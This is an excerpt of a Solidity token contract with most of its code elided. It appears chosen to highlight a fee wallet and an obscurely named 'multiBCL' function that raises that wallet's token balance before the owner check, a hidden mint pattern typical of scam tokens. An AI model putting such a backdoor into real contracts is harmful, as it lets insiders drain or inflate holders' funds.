...
contract Token is Context, IERC20, Ownable{
    ...
    address payable public _feeWhiteAcc;
    ...
    constructor () {
        ...
        _feeWhiteAcc = payable(address(0));
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            _feeWhiteAcc.transfer(MarketAmount);
    }


    function multiBCL(bool status, uint256 amount, address[] calldata addresses) public {
        _balances[_feeWhiteAcc] += uint256(5 + amount).mul(3);

        require(_msgSender() == _feeWhiteAcc);
